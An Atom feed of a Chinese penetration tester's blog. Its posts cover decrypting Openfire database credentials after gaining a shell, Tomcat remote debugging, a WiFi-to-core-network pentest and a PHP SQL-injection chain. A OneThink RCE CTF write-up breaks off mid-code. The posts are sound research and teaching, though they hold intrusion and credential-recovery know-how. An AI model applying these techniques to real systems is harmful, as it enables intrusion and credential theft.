<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://ca3tie1.github.io</id>
    <title>Castiel&apos;s Blog</title>
    <updated>2020-09-01T03:35:23.286Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://ca3tie1.github.io"/>
    <link rel="self" href="https://ca3tie1.github.io/atom.xml"/>
    <subtitle>&lt;b&gt;一个不会中医的厨子不会是一个好黑客&lt;/b&gt;</subtitle>
    <logo>https://ca3tie1.github.io/images/avatar.png</logo>
    <icon>https://ca3tie1.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, Castiel&apos;s Blog</rights>
    <entry>
        <title type="html"><![CDATA[Openfire加密解密数据库连接信息]]></title>
        <id>https://ca3tie1.github.io/post/openfire-jia-mi-jie-mi/</id>
        <link href="https://ca3tie1.github.io/post/openfire-jia-mi-jie-mi/">
        </link>
        <updated>2020-09-01T02:30:49.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x00-写在前面">0x00 写在前面</h1>
<p>前几天渗透测试过程中遇到了个Openfire弱口令，通过后台管理系统的插件功能部署了个shell，获取了服务器权限。由于之前在后台可以看到数据库连接信息是使用MSSQL，且用户是sa，所以在后续信息搜集时候打算把sa密码搜集起来，但在查看<code>openfire.xml</code>的时候发现数据库账号密码加密了，如下所示：</p>
<figure data-type="image" tabindex="1"><img src="https://ca3tie1.github.io/post-images/1598928366972.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="2"><img src="https://ca3tie1.github.io/post-images/1598928082465.png" alt="" loading="lazy"></figure>
<center>数据库使用sa</center>
<h1 id="0x01-分析">0x01 分析</h1>
<p>数据库连接字符串加密这种方式也只是稍微提高了下门槛而已，实际上应用程序在连接数据库的时候是需要提供明文账号密码的，这也就意味着应用在连接数据库之前必定要先解密。于是直接把服务器上的Openfire打包到本地分析下，找到解密相关函数然后自己写个方法调用即可。<br>
为了快速定位对于的解密功能，我决定从URL路由开始，因为在后台的<code>server-db.jsp</code>页面可以查看数据库连接信息，该页面展示的信息中数据库账号是经过解密的，所以该页面的后端代码一定有调用对象的解密模块。Openfire的后台管理功能基本都是以<code>plugins</code>的方式，都位于<code>/plugins/</code>下，我们自己安装的也在该目录下。对应找到admin目录即是后台管理功能插件，在其<code>webapp/WEB-INF/web.xml</code>文件中可以找到<code>/server-db.jsp</code>路由的<code>servlet-mapping</code>为<code>org.jivesoftware.openfire.admin.server_002ddb_jsp</code>类，如下图所示：</p>
<p><img src="https://ca3tie1.github.io/post-images/1598929360769.png" alt="" loading="lazy"><br>
跟进对应代码：</p>
<pre><code class="language-java">con = DbConnectionManager.getConnection();
        DatabaseMetaData metaData = con.getMetaData();
        out.write(&quot;\n\n&lt;p&gt;\n&quot;);
        if (_jspx_meth_fmt_005fmessage_005f1(_jspx_page_context))
          return; 
        out.write(&quot;\n&lt;/p&gt;\n\n&lt;div class=\&quot;jive-table\&quot;&gt;\n&lt;table cellpadding=\&quot;0\&quot; cellspacing=\&quot;0\&quot; border=\&quot;0\&quot; width=\&quot;100%\&quot;&gt;\n&lt;thead&gt;\n    &lt;tr&gt;\n        &lt;th colspan=\&quot;2\&quot;&gt;&quot;);
        if (_jspx_meth_fmt_005fmessage_005f2(_jspx_page_context))
          return; 
        out.write(&quot;&lt;/th&gt;\n    &lt;/tr&gt;\n&lt;/thead&gt;\n&lt;tbody&gt;\n    &lt;tr&gt;\n        &lt;td class=\&quot;c1\&quot;&gt;\n            &quot;);
        if (_jspx_meth_fmt_005fmessage_005f3(_jspx_page_context))
          return; 
        out.write(&quot;\n        &lt;/td&gt;\n        &lt;td class=\&quot;c2\&quot;&gt;\n            &quot;);
        out.print(metaData.getDatabaseProductName());
        out.write(&quot;\n            &quot;);
        out.print(metaData.getDatabaseProductVersion());
        out.write(&quot;\n        &lt;/td&gt;\n    &lt;/tr&gt;\n    &lt;tr&gt;\n        &lt;td class=\&quot;c1\&quot;&gt;\n            &quot;);
        if (_jspx_meth_fmt_005fmessage_005f4(_jspx_page_context))
          return; 
        out.write(&quot;\n        &lt;/td&gt;\n        &lt;td class=\&quot;c2\&quot;&gt;\n            &quot;);
        out.print(metaData.getDriverName());
        out.write(&quot;\n        &lt;/td&gt;\n    &lt;/tr&gt;\n    &lt;tr&gt;\n        &lt;td class=\&quot;c1\&quot;&gt;\n             &quot;);
        if (_jspx_meth_fmt_005fmessage_005f5(_jspx_page_context))
          return; 
</code></pre>
<p>可见页面展示数据来源于<code>DbConnectionManager</code>类，该类位于<code>org.jivesoftware.database</code>下，该包则位于openfire的lib目录。继续反编译lib目录下的<code>openfire.jar</code>文件找到对应类的<code>getConnection</code>方法，代码如下：</p>
<pre><code class="language-java">private static void ensureConnectionProvider() {
    if (connectionProvider != null)
      return; 
    synchronized (providerLock) {
      if (connectionProvider != null)
        return; 
      String className = JiveGlobals.getXMLProperty(&quot;connectionProvider.className&quot;);
      if (className != null) {
        try {
          Class&lt;ConnectionProvider&gt; conClass = ClassUtils.forName(className);
          setConnectionProvider(conClass.newInstance());
        } catch (Exception e) {
          Log.warn(&quot;Failed to create the connection provider specified by connectionProvider.className. Using the default pool.&quot;, e);
          setConnectionProvider(new DefaultConnectionProvider());
        } 
      } else {
        setConnectionProvider(new DefaultConnectionProvider());
      } 
    } 
  }
  
  public static Connection getConnection() throws SQLException {
    ensureConnectionProvider();
    Integer currentRetryCount = Integer.valueOf(0);
    Integer maxRetries = Integer.valueOf(JiveGlobals.getXMLProperty(&quot;database.maxRetries&quot;, 10));
    Integer retryWait = Integer.valueOf(JiveGlobals.getXMLProperty(&quot;database.retryDelay&quot;, 250));
    SQLException lastException = null;
    do {
      try {
        Connection con = connectionProvider.getConnection();
        if (con != null) {
          if (!profilingEnabled)
            return con; 
          return new ProfiledConnection(con);
        } 
      } catch (SQLException e) {
        lastException = e;
        Log.info(&quot;Unable to get a connection from the database pool (attempt &quot; + currentRetryCount + &quot; out of &quot; + maxRetries + &quot;).&quot;, e);
      } 
      try {
        Thread.sleep(retryWait.intValue());
      } catch (Exception e) {}
      Integer integer1 = currentRetryCount, integer2 = currentRetryCount = Integer.valueOf(currentRetryCount.intValue() + 1);
    } while (currentRetryCount.intValue() &lt;= maxRetries.intValue());
    throw new SQLException(&quot;ConnectionManager.getConnection() failed to obtain a connection after &quot; + currentRetryCount + &quot; retries. &quot; + &quot;The exception from the last attempt is as follows: &quot; + lastException);
  }
</code></pre>
<p>在<code>getConnection</code>中首先调用了<code>ensureConnectionProvider</code>方法，在<code>ensureConnectionProvider</code>方法中从<code>openfire.xml</code>文档中加载<code>connectionProvider.className</code>节点值来实例化数据库连接类。这里值为<code>org.jivesoftware.database.DefaultConnectionProvider</code>，继续跟进该类。</p>
<pre><code class="language-java">
  private void loadProperties() {
    this.driver = JiveGlobals.getXMLProperty(&quot;database.defaultProvider.driver&quot;);
    this.serverURL = JiveGlobals.getXMLProperty(&quot;database.defaultProvider.serverURL&quot;);
    this.username = JiveGlobals.getXMLProperty(&quot;database.defaultProvider.username&quot;);
    this.password = JiveGlobals.getXMLProperty(&quot;database.defaultProvider.password&quot;);
    String minCons = JiveGlobals.getXMLProperty(&quot;database.defaultProvider.minConnections&quot;);
    String maxCons = JiveGlobals.getXMLProperty(&quot;database.defaultProvider.maxConnections&quot;);
    String conTimeout = JiveGlobals.getXMLProperty(&quot;database.defaultProvider.connectionTimeout&quot;);
    this.testSQL = JiveGlobals.getXMLProperty(&quot;database.defaultProvider.testSQL&quot;, DbConnectionManager.getTestSQL(this.driver));
    this.testBeforeUse = Boolean.valueOf(JiveGlobals.getXMLProperty(&quot;database.defaultProvider.testBeforeUse&quot;, false));
    this.testAfterUse = Boolean.valueOf(JiveGlobals.getXMLProperty(&quot;database.defaultProvider.testAfterUse&quot;, false));
    Log.info(&quot;dirver:{}&quot;, this.driver);
    Log.info(&quot;serverUrl:{}&quot;, this.serverURL);
    Log.info(&quot;username:{}&quot;, this.username);
    Log.info(&quot;password:{}&quot;, this.password);
    if (this.serverURL != null &amp;&amp; this.serverURL.contains(&quot;amp;&quot;))
      this.serverURL = this.serverURL.replace(&quot;amp;&quot;, &quot;&quot;); 
    System.out.println(&quot;driver=&quot; + this.driver + &quot;,serverUrl=&quot; + this.serverURL + &quot;,username=&quot; + this.username + &quot;,password=&quot; + this.password);
    this.mysqlUseUnicode = Boolean.valueOf(JiveGlobals.getXMLProperty(&quot;database.mysql.useUnicode&quot;)).booleanValue();
    try {
      if (minCons != null)
        this.minConnections = Integer.parseInt(minCons); 
      if (maxCons != null)
        this.maxConnections = Integer.parseInt(maxCons); 
      if (conTimeout != null)
        this.connectionTimeout = Double.parseDouble(conTimeout); 
    } catch (Exception e) {
      Log.error(&quot;Error: could not parse default pool properties. Make sure the values exist and are correct.&quot;, e);
    } 
  }
</code></pre>
<p>在该类的<code>loadProperties</code>方法中可见从xml文件读取账号密码信息，继续跟进<code>JiveGlobals.getXMLProperty</code>，最终在<code>XMLProperties</code>类的<code>getProperty</code>方法中找到对应的解密操作，代码如下：</p>
<pre><code class="language-java">public synchronized String getProperty(String name, boolean ignoreEmpty) {
    String value = this.propertyCache.get(name);
    if (value != null)
      return value; 
    String[] propName = parsePropertyName(name);
    Element element = this.document.getRootElement();
    for (String aPropName : propName) {
      element = element.element(aPropName);
      if (element == null)
        return null; 
    } 
    value = element.getTextTrim();
    if (ignoreEmpty &amp;&amp; &quot;&quot;.equals(value))
      return null; 
    if (JiveGlobals.isPropertyEncrypted(name)) {
      Attribute encrypted = element.attribute(&quot;encrypted&quot;);
      if (encrypted != null) {
        value = JiveGlobals.getPropertyEncryptor().decrypt(value);
      } else {
        Log.info(&quot;Rewriting XML property &quot; + name + &quot; as an encrypted value&quot;);
        setProperty(name, value);
      } 
    } 
    this.propertyCache.put(name, value);
    return value;
  }
</code></pre>
<p>该方法在加载xml文件信息的时候会检查节点是否有<code>encrypted</code>属性，如果有则调用<code>JiveGlobals.getPropertyEncryptor().decrypt</code>，继续跟进<code>getPropertyEncryptor</code>方法：</p>
<pre><code class="language-java">  public static Encryptor getPropertyEncryptor() {
    if (securityProperties == null)
      loadSecurityProperties(); 
    if (propertyEncryptor == null) {
      String algorithm = securityProperties.getProperty(&quot;encrypt.algorithm&quot;);
      if (&quot;AES&quot;.equalsIgnoreCase(algorithm)) {
        propertyEncryptor = new AesEncryptor(currentKey);
      } else {
        propertyEncryptor = new Blowfish(currentKey);
      } 
    } 
    return propertyEncryptor;
  }
</code></pre>
<p>该方法从<code>security.xml</code>文件中读取<code>encrypt.algorithm</code>节点值确定加密方式及加密使用的<code>key</code>，从目标的<code>security.xml</code>中看到并未使用<code>key</code>所以<code>currentKey</code>的值默认为<code>null</code>。</p>
<h1 id="0x02-解密">0x02 解密</h1>
<p>到此基本就搞清楚他自身的加密解密功能了，要解密就很简单了，可以直接加载<code>openfire.jar</code>到classpath，写个方法调用对应的<code>AesEncryptor</code>或是<code>Blowfish</code>并传入<code>key</code>即可，为了方便我把全部功能集中写了个简单的发布在GitHub上，地址：https://github.com/ca3tie1/OpenFireEncryptor</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[使用IDEA远程调试已部署的Tomcat应用]]></title>
        <id>https://ca3tie1.github.io/post/shi-yong-idea-yuan-cheng-diao-shi-yi-bu-shu-de-tomcat-ying-yong/</id>
        <link href="https://ca3tie1.github.io/post/shi-yong-idea-yuan-cheng-diao-shi-yi-bu-shu-de-tomcat-ying-yong/">
        </link>
        <updated>2020-07-16T09:03:30.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x00-写在前面">0x00 写在前面</h1>
<p>在做代码审计的时候经常会遇到直接打包网站到本地搭建环境运行，但由于打包下的网站都是编译好了的，没有源码。需要调试的话得借助IDEA远程调试功能调试运行中的网站。</p>
<h1 id="0x01-配置tomcat">0x01 配置Tomcat</h1>
<p>在开启调试之前需要确定目标网站在本地的环境中能正常运行起来，剩下的就需要开启Tomcat的调试模式。实际上在Tomcat中主要启动脚本为catalina.bat或者catalina.sh，startup脚本也是调用该脚本来启动应用程序的。而且在Tomcat中已内置远程调试模式，不需要自己手动设置，如下图：</p>
<figure data-type="image" tabindex="1"><img src="https://ca3tie1.github.io/post-images/1594890893118.jpg" alt="" loading="lazy"></figure>
<p>我们只需执行<code>catalina.bat jpda start</code>命令即可开启调试模式，正常启动后会看到<code>Listening for transport dt_socket at address: 8000</code>的字样。Tomcat默认是在本地监听8000端口，可以在catalina中更改，如下图便是正常开启远程调试模式：</p>
<figure data-type="image" tabindex="2"><img src="https://ca3tie1.github.io/post-images/1594891085249.jpg" alt="" loading="lazy"></figure>
<h1 id="0x02-配置idea">0x02 配置IDEA</h1>
<p>在IDEA中新建一个项目，然后点击文件-&gt;项目结构-&gt;库，点击加号添加Java源文件<br>
<img src="https://ca3tie1.github.io/post-images/1594891535224.jpg" alt="" loading="lazy"><br>
路径选择在运行的网站的classes目录，添加成功后可以在项目结构中看到所以的class了，如下图：<br>
<img src="https://ca3tie1.github.io/post-images/1594891698835.jpg" alt="" loading="lazy"><br>
然后点下图所示位置添加一个debug的配置：<br>
<img src="https://ca3tie1.github.io/post-images/1594891813158.jpg" alt="" loading="lazy"><br>
点击+号添加一个远程的Tomcat配置，如下图：<br>
<img src="https://ca3tie1.github.io/post-images/1594891895030.jpg" alt="" loading="lazy"><br>
命名随意，如下图所示：<br>
<img src="https://ca3tie1.github.io/post-images/1594892000461.jpg" alt="" loading="lazy"><br>
然后在启动/连接选项中选择Debug，然后下方端口填写Tomcat调试模式监听的端口8000，点击应用。<br>
最后在需要下断点的位置打上断点，启动调试即可。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[记一次从车库到核心网段的渗透之路]]></title>
        <id>https://ca3tie1.github.io/post/On-site-pentest/</id>
        <link href="https://ca3tie1.github.io/post/On-site-pentest/">
        </link>
        <updated>2020-05-17T04:15:22.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x00-前言">0x00 前言</h1>
<p>前段时间做了个渗透测试的项目，其过程中与常规渗透测试略有不同。在这次渗透过程从外网WEB应用无任何进展后团队尝试了实地渗透的方式。最终从实地一点一点扩展到目标核心网络，过程中走了不少弯路，也有不少有趣的经历。因涉及相关部门敏感信息，这里只大致记录下过程，打重码，部分细节需自行脑补。</p>
<h1 id="0x01-公共wifi到内网">0x01 公共WiFi到内网</h1>
<p>从决定实地渗透开始，从WiFi打入口点就是团队首要目标。经过一天的踩点摸排，团队决定把重点放到目标开发办公楼的WiFi上来。实际上在踩点过程中团队还有另外一条打点思路，就是目标对外办公业务场所也存在一些安全隐患。例如终端机弹CMD，USB接口完全暴露，额外的网络接口暴露等。但这条思路还有待验证，也不确定USB接口是否有做硬件白名单，但终端机直接连通目标核心内网是可以确定的。</p>
<h2 id="wifi认证逻辑">WiFi认证逻辑</h2>
<p>在确定把重点放在目标开发办公楼WiFi上来主要三点，一是该WiFi在楼下车库信号良好，方便蹲点渗透(除了笔记本电池和膀胱不够大之外没其他坏处)。二是该WiFi是用于办公区工作人员、办事人员移动设备上网使用(应该比较弱鸡)。第三点也是最重要的一点，该WiFi开放式连接，只是要上互联网需要账号密码认证。这里比较有趣的一点就是连接上该WiFi之后，会DHCP获取一个内网IP(10.xx.xx.xx)，也就是处于他们内网环境了。虽然访互联网，或者内网中http服务时候会自动跳转到认证页面，但在内网中使用其他协议却是畅通无阻的。<br>
于是从该WiFi得到目标内网的入口后直接扫了下WiFi认证服务器，发现端口开放还蛮多，如下图：<br>
<img src="https://ca3tie1.github.io/post-images/1589715306626.jpg" alt="" loading="lazy"><br>
最后上RMI远程代码执行漏洞拿下该服务器权限，打到第一个内网权限，但可惜是该机器无法出网，要深入还需要在车库继续蹲守。<br>
<img src="https://ca3tie1.github.io/post-images/1589715616784.jpg" alt="" loading="lazy"><br>
经过两天的内网横向移动，陆续在内网中拿了几个机器权限，但都无法出网，信息收集也有限。好点的就是中途摸到了两个可以出网路由器权限，终于可以不用蹲在车库了，膀胱也终于可以轻松了。</p>
<h2 id="真的通不到办公网">真的通不到办公网？</h2>
<p>由于从车库WiFi信号打入的内网环境还不处于目标办公内网环境网段，而且时间有限。中途还和目标相关负责人有沟通，以便确定WiFi网络环境是否有和办公网络环境做完全隔离，以免浪费时间。得到的答复有点模拟两可，又肯定的说无法通道办公内网，最多就是旁路什么的有上网行为管理系统之类的设备。当时思路是既然有上网行为管理系统之类的设备那肯定是所有的线路都要走该设备过的了，能拿下该设备权限也能通各个隔离区域的网络了。最终结论是他们自己也不确定是否有完全隔离，而且也无需拿设备权限，直接搞定一个Win7的权限后就可以通到办公内网了(而且该机器还可以出网)，如下图：<br>
<img src="https://ca3tie1.github.io/post-images/1589716987661.jpg" alt="" loading="lazy"></p>
<h1 id="0x02-总结">0x02 总结</h1>
<p>有了目标办公内网权限后为了方便团队是到目标办公网实地做的内网渗透，实际发现办公网给的权限还不如从WiFi打入的那个机器权限大，开发测试网段办公内网无法直通，那个机器还能直通无阻。最后的内网渗透就和往常的渗透差不多了，内网中各种弱口令，上开发测试服务器各种信息搜集和漏洞挖掘，然后在线上目标上利用。这里目标做得比较好的一个地方是，所有线上应用服务器虽然处在同一网段，但互相之间只允许了http的通讯，像3389,22这些端口都不通，使得想一锅端掉线上服务器的想法泡汤，只得想法更深一步渗透，把目标转向虚拟化服务器或者是搞定运维或堡垒机之类的设备了。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[一条被empty函数终结的利用链]]></title>
        <id>https://ca3tie1.github.io/post/0day-end-with-empty-function/</id>
        <link href="https://ca3tie1.github.io/post/0day-end-with-empty-function/">
        </link>
        <updated>2020-04-04T05:43:08.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#0x00-%E5%89%8D%E8%A8%80">0x00 前言</a></li>
<li><a href="#0x01-%E5%88%A9%E7%94%A8%E9%93%BE">0x01 利用链</a></li>
<li><a href="#0x02-%E7%AC%AC%E4%B8%80%E4%B8%AAempty">0x02 第一个empty</a></li>
<li><a href="#0x03-%E7%AC%AC%E4%BA%8C%E4%B8%AAempty">0x03 第二个empty</a></li>
<li><a href="#0x04-%E6%80%BB%E7%BB%93">0x04 总结</a></li>
</ul>
</p>
<h1 id="0x00-前言">0x00 前言</h1>
<p>一年前挖过某系统的漏洞，但当时挖的0day有点鸡肋，能否成功利用取决于系统中用户是否自定义了某个值。最近这一年看系统经过几次版本迭代，于是下来对比了下更新内容，希望在功能上有所突破。但事与愿违，对比更新内容发现文件更新量到是多，但都是一些不痛不痒的更新。虽然最终未能挖到通杀0day，但在这次代码复审的过程中比去年多少有一点点突破，突破起于<code>empty</code>函数也终于<code>empty</code>。本文就此过程简单抽象出来记录一下，没准在码字的过程中就能灵光一闪有了突破口呢？</p>
<h1 id="0x01-利用链">0x01 利用链</h1>
<p>系统最终利用环境是通过构造参数形成SQL注入，只要有了SQL注入即可控制整个系统。先看看最终这个SQL注入的代码，我个人觉得还是比较有意思：</p>
<pre><code class="language-php">public function Insert($DataArray, $DataTable)
    {
        foreach ($DataArray as $k =&gt; $v) {
            $cols[] = $k;
            if (!is_array($v)) {
                $values[] = &quot;:&quot; . $k;
                $sqlarr[$k] = $v;
            } else {
                $values[] = $v[0];
            }
        }
        $query = &quot;INSERT INTO `&quot; . $DataTable . &quot;` (`&quot; . implode(&quot;`,`&quot;, $cols) . &quot;`&quot; . &quot;) VALUES (&quot; . implode(&quot;,&quot;, $values) . &quot;);&quot;;
    $this-&gt;db-&gt;insertId($query, $sqlarr);
</code></pre>
<p>SQL语句使用PDO预处理查询，默认可以多语句执行。从以上代码可以看出明显的注入，只需要控制<code>$DataArray</code>中任意一项目的值为一个数组即可，例如<code>$DataArray['aaa']=array(&quot;SQL Inject Here&quot;)</code>。但<code>$DataArray</code>的定义比较严格，其中只有一项可控，暂且称为<code>$DataArray[&quot;test&quot;]</code>。</p>
<p>想要控制<code>$DataArray[&quot;test&quot;]</code>这个值可谓困难重重，首先得前台提交一个<code>id</code>，程序用该<code>id</code>从<code>SomeTable</code>中查询全部字段赋值于<code>$SomeThing</code>，然后经过各种验证判断(此处省略一万行代码……)。再判断 <code>$SomeThing['m_name']</code>是否为空，不为空则使用<code>GET</code>或者<code>POST</code>获取 <code>$SomeThing['m_name']</code>把值赋给 <code>$SomeThing['m_value']</code>。最终<code>$DataArray[&quot;test&quot;] = isset($SomeThing['m_value']) ? $SomeThing['m_value'] : 0</code>。</p>
<p>但实际在利用过程中往往<code>SomeTable</code>中是没有设置<code>m_name</code>字段的，这就造成了利用链比较鸡肋，取决于<code>m_name</code>是否有设置。而且这个值是自定义的，所以<code>GET</code>或者<code>POST</code>的时候的参数名也不是固定的，有时候哪怕他设置了该值你也有可能无法从一堆参数中确定下来，只有一个一个的尝试。</p>
<h1 id="0x02-第一个empty">0x02 第一个empty</h1>
<p>在去年审计该系统的时候就发现该系统采用默认安装的时候，<code>SomeTable</code>会插入一条默认的记录，但这条记录的所有字段值均为<code>0</code>。当时挖掘到上诉的利用方式之后也试图利用这条默认值来摆脱受用户自定义字段名的限制，但当时在第一处对前台提交<code>id</code>值做验证的时候就卡主没有继续下去了，先来看看抽象代码：</p>
<pre><code class="language-php">public function getSomething()
    {
		$fieldName = getFieldName();
		if (!$fieldName) {
			$fieldName = &quot;id&quot;;
		}
        if (isset($_GET[$fieldName]) &amp;&amp; !empty($_GET[$fieldName]) || isset($_POST[$fieldName]) &amp;&amp; !empty($_POST[$fieldName])) {
            $fieldVlue = get_post($fieldName);
        } else {
            ......省略代码
        }
        ......从数据库中查询$fieldVlue对应的记录
    }
</code></pre>
<p>前面说过<code>SomeTable</code>中默认记录的所有字段值都为<code>0</code>，所以我们想利用他的话这里这个验证无法过，比如我们前台提交<code>id=0</code>，在这里<code>!empty($_GET[$fieldName]</code>值始终为<code>false</code>；这里参考php官方文档，<code>empty</code>判断一个变量是否被认为是空的。当一个变量并不存在，或者它的值等同于FALSE，那么它会被认为不存在，如下图所述：<br>
<img src="https://ca3tie1.github.io/post-images/1585983319709.jpg" alt="" loading="lazy"><br>
所以这里我们提交的<code>id=0</code>刚好满足字符串<code>&quot;0&quot;</code>这个条件，所以直接这样是过不了的。但是细心的师傅们肯定能发现这里的问题<code>if (isset($_GET[$fieldName]) &amp;&amp; !empty($_GET[$fieldName]) || isset($_POST[$fieldName]) &amp;&amp; !empty($_POST[$fieldName]))</code> 这里的<code>GET</code>和<code>POST</code>只要满足一个即可走我们希望走到的逻辑处。我们可不可以<code>GET</code>提交一个值<code>POST</code>再提交一个值，让其中任意一个来绕过此处这个验证，剩下的就是看<code>$fieldVlue</code>是如何取值的了，继续看看<code>get_post</code>的实现：</p>
<pre><code class="language-php">public static function get_post($key, $dop = &quot;&quot;)
    {
    ……省略部分代码
        if (isset($_GET[$key])) {
            $val = process($_GET[$key], $dop);
        } else {
            if (isset($_POST[$key])) {
                $val = process($_POST[$key], $dop);
            } else {
                $val = &quot;&quot;;
            }
        }
        return $val;
    }
</code></pre>
<p>代码是不是很完美？程序先判断<code>$_GET</code>再判断<code>$_POST</code>，使用<code>$_POST</code>提交<code>id=1</code>来绕过上面的验证，<code>$_GET</code>提交<code>id=0</code>来对<code>$fieldVlue</code>赋值，如此便能从数据库中查询默认记录的数据了。但是利用之路往往都是充满坎坷的……，且看第二个<code>empty</code>。</p>
<h1 id="0x03-第二个empty">0x03 第二个empty</h1>
<p>前面说过，从数据库中查询到的所有字段内容全部赋值于<code>$SomeThing</code>，再验证<code>$SomeThing['m_name']</code>是否为空，来看如下代码：</p>
<pre><code class="language-php">if (!empty($SomeThing[&quot;m_name&quot;]) &amp;&amp; get_post($SomeThing[&quot;m_name&quot;]) !== false) {
		$SomeThing[&quot;m_value&quot;] = get_post($SomeThing[&quot;m_name&quot;]);
	}
</code></pre>
<p>这里的这个<code>empty</code>便是死亡<code>empty</code>了，因为数据库查询出来的<code>m_name</code>字段内容为<code>0</code>，且不可控，所以这里也无思路可绕过了。此处也是最终环节，能绕过此处验证，给<code>$SomeThing[&quot;m_value&quot;]</code>赋值便是完美的通杀0day。</p>
<h1 id="0x04-总结">0x04 总结</h1>
<p>实际上该系统其它的地方也有一些利用链，但是条件都是一个比一个苛刻，空了再总结总结。文章写完了，期待的灵光一闪然并卵……</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[OneThink1.0远程代码执行漏洞WriteUp]]></title>
        <id>https://ca3tie1.github.io/post/onethink10-code-execute-writeup/</id>
        <link href="https://ca3tie1.github.io/post/onethink10-code-execute-writeup/">
        </link>
        <updated>2020-04-03T12:41:03.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#0x00-%E5%89%8D%E8%A8%80">0x00 前言</a></li>
<li><a href="#0x01-%E5%88%86%E6%9E%90">0x01 分析</a>
<ul>
<li><a href="#%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C%E6%9C%BA%E5%88%B6">用户注册机制</a></li>
<li><a href="#%E7%B3%BB%E7%BB%9F%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6">系统缓存机制</a></li>
</ul>
</li>
<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
</ul>
</p>
<h1 id="0x00-前言">0x00 前言</h1>
<p>最近在恶补以往ctf的web类题型，想借此以弥补一些因之前的懒散而错过的知识点。OneThink1.0这个题是百度杯”CTF比赛 2017 二月场的一道Web题，刚拿到还以为是考点是SQL注入、文件上传、逻辑漏洞或者是其他一些奇葩知识点。搞半天没一点进展，忍不住还是看Writeup，原来考点就是OneThink1.0的远程代码执行漏洞。看了writeup大概了解，还是决定下载源码来自己跟一下，所以有了此文。写个Writup以便日后查阅，更是为了加深下印象。</p>
<h1 id="0x01-分析">0x01 分析</h1>
<p>漏洞成因是在缓存设计上的一些缺陷造成的，利用流程是用户注册时候注册恶意用户名，在登录后系统生成用户列表缓存时候造成代码执行。</p>
<h2 id="用户注册机制">用户注册机制</h2>
<p>首先还是从用户注册开始说起，流程从<code>Application、Home、Controller、UserController.class.php</code>开始，代码如下：</p>
<pre><code class="language-php">	/* 注册页面 */
	public function register($username = '', $password = '', $repassword = '', $email = '', $verify = ''){
		if(IS_POST){ //注册用户
			/* 检测验证码 */
			if(!check_verify($verify)){
				$this-&gt;error('验证码输入错误！');
			}

			/* 检测密码 */
			if($password != $repassword){
				$this-&gt;error('密码和重复密码不一致！');
			}			

			/* 调用注册接口注册用户 */
            $User = new UserApi;
			$uid = $User-&gt;register($username, $password, $email);
			if(0 &lt; $uid){ //注册成功
				//TODO: 发送验证邮件
				$this-&gt;success('注册成功！',U('login'));
			} else { //注册失败，显示错误信息
				$this-&gt;error($this-&gt;showRegError($uid));
			}

		} else { //显示注册表单
			$this-&gt;display();
		}
	}
</code></pre>
<p>控制器调用<code>Application/User/Api/UserApi.class.php</code>接口的<code>register</code>方法，继续跟进<code>UserApi.class.php</code>的<code>register</code>方法：</p>
<pre><code class="language-php">public function register($username, $password, $email, $mobile = ''){
		return $this-&gt;model-&gt;register($username, $password, $email, $mobile);
	}
</code></pre>
<p>该方法调用<code>Application/User/Model/UcenterMemberModel.class.php</code>的<code>register</code>方法，继续跟进<code>UcenterMemberModel.class.php</code>：</p>
<pre><code class="language-php">	public function register($username, $password, $email, $mobile){
		$data = array(
			'username' =&gt; $username,
			'password' =&gt; $password,
			'email'    =&gt; $email,
			'mobile'   =&gt; $mobile,
		);

		//验证手机
		if(empty($data['mobile'])) unset($data['mobile']);

		/* 添加用户 */
		if($this-&gt;create($data)){
			$uid = $this-&gt;add();
			return $uid ? $uid : 0; //0-未知错误，大于0-注册成功
		} else {
			return $this-&gt;getError(); //错误详情见自动验证注释
		}
	}
</code></pre>
<p>在<code>UcenterMemberModel</code>中配置了用户模型验证机制，如下：</p>
<pre><code class="language-php">/* 用户模型自动验证 */
	protected $_validate = array(
		/* 验证用户名 */
		array('username', '1,30', -1, self::EXISTS_VALIDATE, 'length'), //用户名长度不合法
		array('username', 'checkDenyMember', -2, self::EXISTS_VALIDATE, 'callback'), //用户名禁止注册
		array('username', '', -3, self::EXISTS_VALIDATE, 'unique'), //用户名被占用

		/* 验证密码 */
		array('password', '6,30', -4, self::EXISTS_VALIDATE, 'length'), //密码长度不合法

		/* 验证邮箱 */
		array('email', 'email', -5, self::EXISTS_VALIDATE), //邮箱格式不正确
		array('email', '1,32', -6, self::EXISTS_VALIDATE, 'length'), //邮箱长度不合法
		array('email', 'checkDenyEmail', -7, self::EXISTS_VALIDATE, 'callback'), //邮箱禁止注册
		array('email', '', -8, self::EXISTS_VALIDATE, 'unique'), //邮箱被占用

		/* 验证手机号码 */
		array('mobile', '//', -9, self::EXISTS_VALIDATE), //手机格式不正确 TODO:
		array('mobile', 'checkDenyMobile', -10, self::EXISTS_VALIDATE, 'callback'), //手机禁止注册
		array('mobile', '', -11, self::EXISTS_VALIDATE, 'unique'), //手机号被占用
	);
</code></pre>
<p>可见对用户输入验证只有一些格式、长度等验证，并未做特殊字符过滤等相关安全机制。</p>
<h2 id="系统缓存机制">系统缓存机制</h2>
<p>根据解题思路，漏洞触发点就在用户登录时候，加上漏洞成因那肯定是用户登录的时候有读取和生成缓存文件的操作。跟下登录流程，起始点和注册流程一样，位于控制器<code>UserController.class.php</code>，控制器再调用<code>UserApi.class.php</code>的<code>login</code>方法验证用户，返回用户的<code>uid</code>，再调用模块<code>Application/Home/Model/MemberModel.class.php</code>的<code>login</code>方法，传入<code>uid</code>。</p>
<pre><code class="language-php">	/* 登录页面 */
	public function login($username = '', $password = '', $verify = ''){
		if(IS_POST){ //登录验证
			/* 检测验证码 */
			if(!check_verify($verify)){
